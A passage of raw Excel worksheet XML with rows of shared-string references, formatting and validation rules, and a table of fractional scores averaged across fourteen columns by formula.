        <v>2970</v>
      </c>
      <c r="H106" t="s">
        <v>3190</v>
      </c>
    </row>
    <row r="107" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A107" t="s">
        <v>3191</v>
      </c>
      <c r="B107" t="s">
        <v>3192</v>
      </c>
      <c r="E107" t="s">
        <v>3016</v>
      </c>
      <c r="F107" t="s">
        <v>598</v>
      </c>
      <c r="G107" t="s">
        <v>2968</v>
      </c>
      <c r="H107" t="s">
        <v>3193</v>
      </c>
    </row>
    <row r="108" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A108" t="s">
        <v>3194</v>
      </c>
      <c r="G108" t="s">
        <v>2970</v>
      </c>
      <c r="H108" t="s">
        <v>3195</v>
      </c>
    </row>
    <row r="109" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A109" t="s">
        <v>3196</v>
      </c>
      <c r="G109" t="s">
        <v>2970</v>
      </c>
      <c r="H109" t="s">
        <v>3197</v>
      </c>
    </row>
    <row r="110" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A110" t="s">
        <v>3198</v>
      </c>
      <c r="G110" t="s">
        <v>2970</v>
      </c>
      <c r="H110" t="s">
        <v>3199</v>
      </c>
    </row>
    <row r="111" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A111" t="s">
        <v>3200</v>
      </c>
      <c r="B111" t="s">
        <v>3201</v>
      </c>
      <c r="E111" t="s">
        <v>3042</v>
      </c>
      <c r="F111" t="s">
        <v>386</v>
      </c>
      <c r="G111" t="s">
        <v>2968</v>
      </c>
      <c r="H111" t="s">
        <v>3202</v>
      </c>
    </row>
    <row r="112" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A112" t="s">
        <v>3203</v>
      </c>
      <c r="G112" t="s">
        <v>2970</v>
      </c>
      <c r="H112" t="s">
        <v>3204</v>
      </c>
    </row>
    <row r="113" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A113" t="s">
        <v>3205</v>
      </c>
      <c r="B113" t="s">
        <v>3206</v>
      </c>
      <c r="E113" t="s">
        <v>3042</v>
      </c>
      <c r="F113" t="s">
        <v>3180</v>
      </c>
      <c r="G113" t="s">
        <v>2968</v>
      </c>
      <c r="H113" t="s">
        <v>3207</v>
      </c>
    </row>
    <row r="114" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A114" t="s">
        <v>1304</v>
      </c>
      <c r="G114" t="s">
        <v>2970</v>
      </c>
      <c r="H114" t="s">
        <v>3208</v>
      </c>
    </row>
    <row r="115" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A115" t="s">
        <v>3209</v>
      </c>
      <c r="B115" t="s">
        <v>3210</v>
      </c>
      <c r="E115" t="s">
        <v>3042</v>
      </c>
      <c r="F115" t="s">
        <v>368</v>
      </c>
      <c r="G115" t="s">
        <v>2968</v>
      </c>
      <c r="H115" t="s">
        <v>3211</v>
      </c>
    </row>
    <row r="116" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A116" t="s">
        <v>3212</v>
      </c>
      <c r="G116" t="s">
        <v>2970</v>
      </c>
      <c r="H116" t="s">
        <v>3213</v>
      </c>
    </row>
    <row r="117" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A117" t="s">
        <v>3214</v>
      </c>
      <c r="G117" t="s">
        <v>2970</v>
      </c>
      <c r="H117" t="s">
        <v>3215</v>
      </c>
    </row>
    <row r="118" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A118" t="s">
        <v>3216</v>
      </c>
      <c r="G118" t="s">
        <v>2970</v>
      </c>
      <c r="H118" t="s">
        <v>3217</v>
      </c>
    </row>
    <row r="119" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A119" t="s">
        <v>3218</v>
      </c>
      <c r="B119" t="s">
        <v>3219</v>
      </c>
      <c r="E119" t="s">
        <v>2992</v>
      </c>
      <c r="F119" t="s">
        <v>520</v>
      </c>
      <c r="G119" t="s">
        <v>2968</v>
      </c>
      <c r="H119" t="s">
        <v>3220</v>
      </c>
    </row>
    <row r="120" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A120" t="s">
        <v>3221</v>
      </c>
      <c r="G120" t="s">
        <v>2970</v>
      </c>
      <c r="H120" t="s">
        <v>3222</v>
      </c>
    </row>
    <row r="121" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A121" t="s">
        <v>3223</v>
      </c>
      <c r="G121" t="s">
        <v>2970</v>
      </c>
      <c r="H121" t="s">
        <v>3224</v>
      </c>
    </row>
    <row r="122" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A122" t="s">
        <v>3225</v>
      </c>
      <c r="G122" t="s">
        <v>2970</v>
      </c>
      <c r="H122" t="s">
        <v>3226</v>
      </c>
    </row>
    <row r="123" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A123" t="s">
        <v>3227</v>
      </c>
      <c r="G123" t="s">
        <v>2970</v>
      </c>
      <c r="H123" t="s">
        <v>3228</v>
      </c>
    </row>
    <row r="124" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A124" t="s">
        <v>3229</v>
      </c>
      <c r="G124" t="s">
        <v>2970</v>
      </c>
      <c r="H124" t="s">
        <v>3230</v>
      </c>
    </row>
    <row r="125" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A125" t="s">
        <v>3231</v>
      </c>
      <c r="B125" t="s">
        <v>3232</v>
      </c>
      <c r="E125" t="s">
        <v>3233</v>
      </c>
      <c r="F125" t="s">
        <v>643</v>
      </c>
      <c r="G125" t="s">
        <v>2968</v>
      </c>
      <c r="H125" t="s">
        <v>3234</v>
      </c>
    </row>
    <row r="126" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A126" t="s">
        <v>1985</v>
      </c>
      <c r="G126" t="s">
        <v>2970</v>
      </c>
      <c r="H126" t="s">
        <v>3235</v>
      </c>
    </row>
    <row r="127" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A127" t="s">
        <v>642</v>
      </c>
      <c r="G127" t="s">
        <v>2970</v>
      </c>
      <c r="H127" t="s">
        <v>3236</v>
      </c>
    </row>
    <row r="128" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A128" t="s">
        <v>3237</v>
      </c>
      <c r="G128" t="s">
        <v>2970</v>
      </c>
      <c r="H128" t="s">
        <v>3238</v>
      </c>
    </row>
    <row r="129" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A129" t="s">
        <v>3239</v>
      </c>
      <c r="G129" t="s">
        <v>2970</v>
      </c>
      <c r="H129" t="s">
        <v>3240</v>
      </c>
    </row>
    <row r="130" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A130" t="s">
        <v>1073</v>
      </c>
      <c r="G130" t="s">
        <v>2970</v>
      </c>
      <c r="H130" t="s">
        <v>3241</v>
      </c>
    </row>
    <row r="131" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A131" t="s">
        <v>3242</v>
      </c>
      <c r="B131" t="s">
        <v>3243</v>
      </c>
      <c r="E131" t="s">
        <v>2967</v>
      </c>
      <c r="F131" t="s">
        <v>485</v>
      </c>
      <c r="G131" t="s">
        <v>2968</v>
      </c>
      <c r="H131" t="s">
        <v>3244</v>
      </c>
    </row>
    <row r="132" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A132" t="s">
        <v>3245</v>
      </c>
      <c r="G132" t="s">
        <v>2970</v>
      </c>
      <c r="H132" t="s">
        <v>3246</v>
      </c>
    </row>
    <row r="133" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A133" t="s">
        <v>3247</v>
      </c>
      <c r="G133" t="s">
        <v>2970</v>
      </c>
      <c r="H133" t="s">
        <v>3248</v>
      </c>
    </row>
    <row r="134" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A134" t="s">
        <v>3249</v>
      </c>
      <c r="G134" t="s">
        <v>2970</v>
      </c>
      <c r="H134" t="s">
        <v>3250</v>
      </c>
    </row>
    <row r="135" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A135" t="s">
        <v>3251</v>
      </c>
      <c r="G135" t="s">
        <v>2970</v>
      </c>
      <c r="H135" t="s">
        <v>3252</v>
      </c>
    </row>
    <row r="136" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A136" t="s">
        <v>3253</v>
      </c>
      <c r="G136" t="s">
        <v>2970</v>
      </c>
      <c r="H136" t="s">
        <v>3254</v>
      </c>
    </row>
    <row r="137" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A137" t="s">
        <v>3255</v>
      </c>
      <c r="B137" t="s">
        <v>3256</v>
      </c>
      <c r="E137" t="s">
        <v>3042</v>
      </c>
      <c r="F137" t="s">
        <v>386</v>
      </c>
      <c r="G137" t="s">
        <v>2968</v>
      </c>
      <c r="H137" t="s">
        <v>3257</v>
      </c>
    </row>
    <row r="138" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A138" t="s">
        <v>3258</v>
      </c>
      <c r="G138" t="s">
        <v>2970</v>
      </c>
      <c r="H138" t="s">
        <v>3259</v>
      </c>
    </row>
    <row r="139" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A139" t="s">
        <v>3260</v>
      </c>
      <c r="B139" t="s">
        <v>3261</v>
      </c>
      <c r="E139" t="s">
        <v>2967</v>
      </c>
      <c r="F139" t="s">
        <v>2336</v>
      </c>
      <c r="G139" t="s">
        <v>2968</v>
      </c>
      <c r="H139" t="s">
        <v>3262</v>
      </c>
    </row>
    <row r="140" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A140" t="s">
        <v>3263</v>
      </c>
      <c r="G140" t="s">
        <v>2970</v>
      </c>
      <c r="H140" t="s">
        <v>3264</v>
      </c>
    </row>
    <row r="141" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A141" t="s">
        <v>1948</v>
      </c>
      <c r="G141" t="s">
        <v>2970</v>
      </c>
      <c r="H141" t="s">
        <v>3265</v>
      </c>
    </row>
    <row r="142" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A142" t="s">
        <v>3266</v>
      </c>
      <c r="B142" t="s">
        <v>3267</v>
      </c>
      <c r="E142" t="s">
        <v>3042</v>
      </c>
      <c r="F142" t="s">
        <v>386</v>
      </c>
      <c r="G142" t="s">
        <v>2968</v>
      </c>
      <c r="H142" t="s">
        <v>3268</v>
      </c>
    </row>
    <row r="143" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A143" t="s">
        <v>3269</v>
      </c>
      <c r="G143" t="s">
        <v>2970</v>
      </c>
      <c r="H143" t="s">
        <v>3270</v>
      </c>
    </row>
    <row r="144" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A144" t="s">
        <v>3271</v>
      </c>
      <c r="G144" t="s">
        <v>2970</v>
      </c>
      <c r="H144" t="s">
        <v>3272</v>
      </c>
    </row>
    <row r="145" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A145" t="s">
        <v>3273</v>
      </c>
      <c r="G145" t="s">
        <v>2970</v>
      </c>
      <c r="H145" t="s">
        <v>3274</v>
      </c>
    </row>
    <row r="146" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A146" t="s">
        <v>3275</v>
      </c>
      <c r="G146" t="s">
        <v>2970</v>
      </c>
      <c r="H146" t="s">
        <v>3276</v>
      </c>
    </row>
  </sheetData>
  <conditionalFormatting sqref="A2:C202">
    <cfRule type="expression" dxfId="0" priority="1" stopIfTrue="1">
      <formula>IF($C2="yes",1,0)</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="1">
    <dataValidation type="custom" allowBlank="1" showInputMessage="1" showErrorMessage="1" sqref="C2:C1048576" xr:uid="{E720379C-3CA5-48AD-9ABA-80F1456070DD}">
      <formula1>IF(C2="yes",1,0)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05FA3-1BB1-4B25-A976-3C9B0E5D2600}">
  <dimension ref="A1:E42"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="B47" sqref="B47"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="8.88671875" customWidth="1"/>
    <col min="2" max="2" width="95.109375" bestFit="1" customWidth="1"/>
    <col min="3" max="4" width="98.6640625" customWidth="1"/>
    <col min="5" max="5" width="84.88671875" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A1" s="26" t="s">
        <v>3277</v>
      </c>
      <c r="B1" s="39" t="s">
        <v>3278</v>
      </c>
      <c r="C1" t="s">
        <v>3279</v>
      </c>
    </row>
    <row r="3" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A3" s="26" t="s">
        <v>3280</v>
      </c>
      <c r="B3" s="26"/>
      <c r="C3" s="26"/>
    </row>
    <row r="4" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A4" s="29" t="s">
        <v>3281</v>
      </c>
      <c r="B4" s="29" t="s">
        <v>3282</v>
      </c>
      <c r="C4" s="29" t="s">
        <v>3283</v>
      </c>
    </row>
    <row r="5" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A5" s="27"/>
      <c r="B5" t="s">
        <v>3284</v>
      </c>
      <c r="C5" t="s">
        <v>3285</v>
      </c>
    </row>
    <row r="6" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A6" s="28"/>
      <c r="B6" t="s">
        <v>3286</v>
      </c>
      <c r="C6" t="s">
        <v>3285</v>
      </c>
    </row>
    <row r="7" spans="1:5" x14ac:dyDescent="0.3">
      <c r="B7" t="s">
        <v>3287</v>
      </c>
      <c r="C7" t="s">
        <v>330</v>
      </c>
    </row>
    <row r="9" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A9" s="26" t="s">
        <v>3288</v>
      </c>
      <c r="B9" s="26"/>
      <c r="C9" s="26"/>
      <c r="D9" s="26"/>
      <c r="E9" s="26"/>
    </row>
    <row r="10" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A10" s="29" t="s">
        <v>3281</v>
      </c>
      <c r="B10" s="29" t="s">
        <v>3282</v>
      </c>
      <c r="C10" s="29" t="s">
        <v>3289</v>
      </c>
    </row>
    <row r="11" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A11" s="17"/>
      <c r="B11" t="s">
        <v>3290</v>
      </c>
      <c r="C11" t="s">
        <v>3291</v>
      </c>
    </row>
    <row r="12" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A12" s="18"/>
      <c r="B12" t="s">
        <v>3292</v>
      </c>
      <c r="C12" t="s">
        <v>3293</v>
      </c>
    </row>
    <row r="13" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A13" s="19"/>
      <c r="B13" t="s">
        <v>3294</v>
      </c>
      <c r="C13" t="s">
        <v>3295</v>
      </c>
    </row>
    <row r="14" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A14" s="23"/>
      <c r="B14" t="s">
        <v>3296</v>
      </c>
      <c r="C14" t="s">
        <v>3297</v>
      </c>
    </row>
    <row r="15" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A15" s="24"/>
      <c r="B15" t="s">
        <v>3298</v>
      </c>
      <c r="C15" t="s">
        <v>3299</v>
      </c>
    </row>
    <row r="16" spans="1:5" x14ac:dyDescent="0.3">
      <c r="A16" s="21"/>
      <c r="B16" t="s">
        <v>3300</v>
      </c>
      <c r="C16" t="s">
        <v>3301</v>
      </c>
    </row>
    <row r="17" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A17" s="35" t="s">
        <v>3302</v>
      </c>
      <c r="B17" t="s">
        <v>3303</v>
      </c>
      <c r="C17" t="s">
        <v>3304</v>
      </c>
    </row>
    <row r="18" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A18" s="20"/>
      <c r="B18" t="s">
        <v>3305</v>
      </c>
      <c r="C18" t="s">
        <v>3306</v>
      </c>
    </row>
    <row r="19" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A19" t="s">
        <v>3307</v>
      </c>
      <c r="B19" t="s">
        <v>3308</v>
      </c>
      <c r="C19" t="s">
        <v>3309</v>
      </c>
    </row>
    <row r="20" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A20" t="s">
        <v>3307</v>
      </c>
      <c r="B20" t="s">
        <v>3310</v>
      </c>
      <c r="C20" t="s">
        <v>3311</v>
      </c>
    </row>
    <row r="22" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A22" s="26" t="s">
        <v>3312</v>
      </c>
      <c r="B22" s="26"/>
      <c r="C22" s="26"/>
      <c r="D22" s="26"/>
    </row>
    <row r="23" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A23" s="29" t="s">
        <v>3281</v>
      </c>
      <c r="B23" s="29" t="s">
        <v>3282</v>
      </c>
      <c r="C23" s="29" t="s">
        <v>3289</v>
      </c>
    </row>
    <row r="24" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A24" s="25"/>
      <c r="B24" t="s">
        <v>3313</v>
      </c>
      <c r="C24" t="s">
        <v>3314</v>
      </c>
    </row>
    <row r="25" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A25" s="20"/>
      <c r="B25" t="s">
        <v>3315</v>
      </c>
      <c r="C25" t="s">
        <v>3316</v>
      </c>
    </row>
    <row r="26" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A26" s="22"/>
      <c r="B26" t="s">
        <v>3317</v>
      </c>
      <c r="C26" t="s">
        <v>3318</v>
      </c>
    </row>
    <row r="27" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A27" s="21"/>
      <c r="B27" t="s">
        <v>3319</v>
      </c>
      <c r="C27" t="s">
        <v>3320</v>
      </c>
    </row>
    <row r="28" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A28" t="s">
        <v>3307</v>
      </c>
      <c r="B28" t="s">
        <v>3321</v>
      </c>
      <c r="C28" t="s">
        <v>3322</v>
      </c>
    </row>
    <row r="30" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A30" s="26" t="s">
        <v>3323</v>
      </c>
      <c r="B30" s="26"/>
      <c r="C30" s="26"/>
    </row>
    <row r="31" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A31" s="29" t="s">
        <v>3281</v>
      </c>
      <c r="B31" s="29" t="s">
        <v>3282</v>
      </c>
      <c r="C31" s="29" t="s">
        <v>3289</v>
      </c>
    </row>
    <row r="32" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A32" s="24"/>
      <c r="B32" t="s">
        <v>3324</v>
      </c>
      <c r="C32" t="s">
        <v>3325</v>
      </c>
    </row>
    <row r="34" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A34" s="26" t="s">
        <v>3326</v>
      </c>
      <c r="B34" s="26"/>
      <c r="C34" s="49" t="s">
        <v>3327</v>
      </c>
      <c r="D34" s="49"/>
    </row>
    <row r="35" spans="1:4" x14ac:dyDescent="0.3">
      <c r="B35" t="s">
        <v>3328</v>
      </c>
      <c r="C35" t="s">
        <v>3329</v>
      </c>
      <c r="D35" t="s">
        <v>3330</v>
      </c>
    </row>
    <row r="36" spans="1:4" x14ac:dyDescent="0.3">
      <c r="B36" t="s">
        <v>3331</v>
      </c>
      <c r="C36" t="s">
        <v>3332</v>
      </c>
      <c r="D36" t="s">
        <v>3333</v>
      </c>
    </row>
    <row r="37" spans="1:4" x14ac:dyDescent="0.3">
      <c r="B37" t="s">
        <v>3334</v>
      </c>
      <c r="C37" t="s">
        <v>3335</v>
      </c>
      <c r="D37" t="s">
        <v>3336</v>
      </c>
    </row>
    <row r="38" spans="1:4" x14ac:dyDescent="0.3">
      <c r="B38" t="s">
        <v>3337</v>
      </c>
      <c r="C38" t="s">
        <v>3338</v>
      </c>
      <c r="D38" t="s">
        <v>3339</v>
      </c>
    </row>
    <row r="40" spans="1:4" x14ac:dyDescent="0.3">
      <c r="A40" t="s">
        <v>3340</v>
      </c>
    </row>
    <row r="41" spans="1:4" x14ac:dyDescent="0.3">
      <c r="B41" t="s">
        <v>3341</v>
      </c>
      <c r="C41" t="s">
        <v>3342</v>
      </c>
    </row>
    <row r="42" spans="1:4" x14ac:dyDescent="0.3">
      <c r="B42" t="s">
        <v>3343</v>
      </c>
      <c r="C42" t="s">
        <v>3344</v>
      </c>
    </row>
  </sheetData>
  <mergeCells count="1">
    <mergeCell ref="C34:D3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2EC44-547E-472F-A35C-65401054B9C0}">
  <dimension ref="A1:Q28"/>
  <sheetViews>
    <sheetView topLeftCell="B1" workbookViewId="0">
      <selection activeCell="P2" sqref="P2"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="10.109375" customWidth="1"/>
    <col min="2" max="2" width="15.109375" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="21.88671875" bestFit="1" customWidth="1"/>
    <col min="4" max="4" width="12.33203125" bestFit="1" customWidth="1"/>
    <col min="5" max="6" width="12.5546875" bestFit="1" customWidth="1"/>
    <col min="7" max="7" width="18.109375" bestFit="1" customWidth="1"/>
    <col min="8" max="8" width="15.5546875" bestFit="1" customWidth="1"/>
    <col min="9" max="9" width="16.5546875" bestFit="1" customWidth="1"/>
    <col min="10" max="10" width="9.5546875" bestFit="1" customWidth="1"/>
    <col min="11" max="11" width="17.5546875" bestFit="1" customWidth="1"/>
    <col min="12" max="12" width="12.5546875" bestFit="1" customWidth="1"/>
    <col min="13" max="13" width="21.109375" bestFit="1" customWidth="1"/>
    <col min="14" max="15" width="12.5546875" bestFit="1" customWidth="1"/>
    <col min="16" max="16" width="16" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A1" s="37" t="s">
        <v>3345</v>
      </c>
      <c r="B1" s="37" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="37" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="37" t="s">
        <v>2</v>
      </c>
      <c r="E1" s="37" t="s">
        <v>3</v>
      </c>
      <c r="F1" s="37" t="s">
        <v>4</v>
      </c>
      <c r="G1" s="37" t="s">
        <v>5</v>
      </c>
      <c r="H1" s="37" t="s">
        <v>6</v>
      </c>
      <c r="I1" s="37" t="s">
        <v>7</v>
      </c>
      <c r="J1" s="37" t="s">
        <v>8</v>
      </c>
      <c r="K1" s="37" t="s">
        <v>9</v>
      </c>
      <c r="L1" s="37" t="s">
        <v>10</v>
      </c>
      <c r="M1" s="37" t="s">
        <v>11</v>
      </c>
      <c r="N1" s="37" t="s">
        <v>12</v>
      </c>
      <c r="O1" s="37" t="s">
        <v>13</v>
      </c>
      <c r="P1" s="38" t="s">
        <v>356</v>
      </c>
    </row>
    <row r="2" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A2" s="7" t="s">
        <v>3346</v>
      </c>
      <c r="B2" s="36">
        <v>0.1</v>
      </c>
      <c r="C2" s="36">
        <v>0.11</v>
      </c>
      <c r="D2" s="36">
        <v>0.6</v>
      </c>
      <c r="E2" s="36">
        <v>0.33</v>
      </c>
      <c r="F2" s="36">
        <v>0.31</v>
      </c>
      <c r="G2" s="36">
        <v>0.27</v>
      </c>
      <c r="H2" s="36">
        <v>0.14000000000000001</v>
      </c>
      <c r="I2" s="36">
        <v>0.18</v>
      </c>
      <c r="J2" s="36">
        <v>0.06</v>
      </c>
      <c r="K2" s="36">
        <v>0.38</v>
      </c>
      <c r="L2" s="36">
        <v>0.16</v>
      </c>
      <c r="M2" s="36">
        <v>0.18</v>
      </c>
      <c r="N2" s="36">
        <v>0.44</v>
      </c>
      <c r="O2" s="36">
        <v>0.21</v>
      </c>
      <c r="P2" s="36">
        <f>(SUM(B2:O2))/14</f>
        <v>0.24785714285714291</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A3" s="7" t="s">
        <v>3347</v>
      </c>
      <c r="B3" s="36">
        <v>1</v>
      </c>
      <c r="C3" s="36">
        <v>0.90773809523809534</v>
      </c>
      <c r="D3" s="36">
        <v>0.6</v>
      </c>
      <c r="E3" s="36">
        <v>0.6785714285714286</v>
      </c>
      <c r="F3" s="36">
        <v>0.50148809523809523</v>
      </c>
      <c r="G3" s="36">
        <v>0.50724489795918404</v>
      </c>
      <c r="H3" s="36">
        <v>0.36673397661769758</v>
      </c>
      <c r="I3" s="36">
        <v>0.48298319327731098</v>
      </c>
      <c r="J3" s="36">
        <v>0.30208333333333337</v>
      </c>
      <c r="K3" s="36">
        <v>0.52500000000000002</v>
      </c>
      <c r="L3" s="36">
        <v>0.23529411764705882</v>
      </c>
      <c r="M3" s="36">
        <v>0.2745098039215686</v>
      </c>
      <c r="N3" s="36">
        <v>0.55555555555555558</v>
      </c>
      <c r="O3" s="36">
        <v>0.35714285714285715</v>
      </c>
      <c r="P3" s="36">
        <f>(SUM(B3:O3))/14</f>
        <v>0.5210246681787275</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A4" s="7" t="s">
        <v>3348</v>
      </c>
      <c r="B4" s="36">
        <v>1</v>
      </c>
      <c r="C4" s="36">
        <v>0.91</v>
      </c>
      <c r="D4" s="36">
        <v>0.9</v>
      </c>
      <c r="E4" s="36">
        <v>0.73</v>
      </c>
      <c r="F4" s="36">
        <v>0.52</v>
      </c>
      <c r="G4" s="36">
        <v>0.57999999999999996</v>
      </c>
      <c r="H4" s="36">
        <v>0.36</v>
      </c>
      <c r="I4" s="36">
        <v>0.54</v>
      </c>
      <c r="J4" s="36">
        <v>0.33</v>
      </c>
      <c r="K4" s="36">
        <v>0.64</v>
      </c>
      <c r="L4" s="36">
        <v>0.24</v>
      </c>
      <c r="M4" s="36">
        <v>0.33</v>
      </c>
      <c r="N4" s="36">
        <v>0.62</v>
      </c>
      <c r="O4" s="36">
        <v>0.36</v>
      </c>
      <c r="P4" s="36">
        <f>(SUM(B4:O4))/14</f>
        <v>0.57571428571428573</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A5" s="7" t="s">
        <v>3349</v>
      </c>
      <c r="B5" s="36">
        <v>1</v>
      </c>
      <c r="C5" s="36">
        <v>0.90773809523809534</v>
      </c>
      <c r="D5" s="36">
        <v>1</v>
      </c>
      <c r="E5" s="36">
        <v>0.75</v>
      </c>
      <c r="F5" s="36">
        <v>0.52261904761904765</v>
      </c>
      <c r="G5" s="36">
        <v>0.60255102040816322</v>
      </c>
      <c r="H5" s="36">
        <v>0.36382699987351153</v>
      </c>
      <c r="I5" s="36">
        <v>0.59523809523809534</v>
      </c>
      <c r="J5" s="36">
        <v>0.33333333333333337</v>
      </c>
      <c r="K5" s="36">
        <v>0.63888888888888884</v>
      </c>
      <c r="L5" s="36">
        <v>0.23529411764705882</v>
      </c>
      <c r="M5" s="36">
        <v>0.33333333333333331</v>
      </c>
      <c r="N5" s="36">
        <v>0.66666666666666663</v>
      </c>
      <c r="O5" s="36">
        <v>0.35714285714285715</v>
      </c>
      <c r="P5" s="36">
        <v>0.5933308896706464</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A6" s="7" t="s">
        <v>3350</v>
      </c>
      <c r="B6" s="36">
        <v>1</v>
      </c>
      <c r="C6" s="36">
        <v>0.90773809523809534</v>
      </c>
      <c r="D6" s="36">
        <v>1</v>
      </c>
      <c r="E6" s="36">
        <v>0.75</v>
      </c>
      <c r="F6" s="36">
        <v>0.542619047619048</v>
      </c>
      <c r="G6" s="36">
        <v>0.64255102040816303</v>
      </c>
      <c r="H6" s="36">
        <v>0.38382699987351199</v>
      </c>
      <c r="I6" s="36">
        <v>0.65523809523809495</v>
      </c>
      <c r="J6" s="36">
        <v>0.33333333333333298</v>
      </c>
      <c r="K6" s="36">
        <v>0.63888888888888884</v>
      </c>
      <c r="L6" s="36">
        <v>0.52529411764705902</v>
      </c>
      <c r="M6" s="36">
        <v>0.413333333333333</v>
      </c>
      <c r="N6" s="36">
        <v>0.66666666666666663</v>
      </c>
      <c r="O6" s="36">
        <v>0.42714285714285699</v>
      </c>
      <c r="P6" s="36">
        <v>0.63333088967064599</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A7" s="7" t="s">
        <v>3351</v>
      </c>
      <c r="B7" s="36">
        <v>1</v>
      </c>
      <c r="C7" s="36">
        <v>0.90773809523809534</v>
      </c>
      <c r="D7" s="36">
        <v>1</v>
      </c>
      <c r="E7" s="36">
        <v>0.75</v>
      </c>
      <c r="F7" s="36">
        <v>0.53556547619047623</v>
      </c>
      <c r="G7" s="36">
        <v>0.64068877551020409</v>
      </c>
      <c r="H7" s="36">
        <v>0.37797428669521688</v>
      </c>
      <c r="I7" s="36">
        <v>0.66141456582633062</v>
      </c>
      <c r="J7" s="36">
        <v>0.39583333333333337</v>
      </c>
      <c r="K7" s="36">
        <v>0.63888888888888884</v>
      </c>
      <c r="L7" s="36">
        <v>0.52941176470588236</v>
      </c>
      <c r="M7" s="36">
        <v>0.47058823529411759</v>
      </c>
      <c r="N7" s="36">
        <v>0.66666666666666663</v>
      </c>
      <c r="O7" s="36">
        <v>0.42857142857142855</v>
      </c>
      <c r="P7" s="36">
        <v>0.64309582263718856</v>
      </c>
    </row>
    <row r="8" spans="1:16" x14ac:dyDescent="0.3">
      <c r="A8" s="7" t="s">
        <v>3352</v>
      </c>
      <c r="B8" s="36">
        <v>1</v>
      </c>
      <c r="C8" s="36">
        <v>0.90773809523809534</v>
      </c>
      <c r="D8" s="36">
        <v>1</v>
      </c>
      <c r="E8" s="36">
        <v>0.75</v>
      </c>
      <c r="F8" s="36">
        <v>0.53556547619047623</v>
      </c>
      <c r="G8" s="36">
        <v>0.64068877551020409</v>
      </c>
      <c r="H8" s="36">
        <v>0.37797428669521688</v>
      </c>
      <c r="I8" s="36">
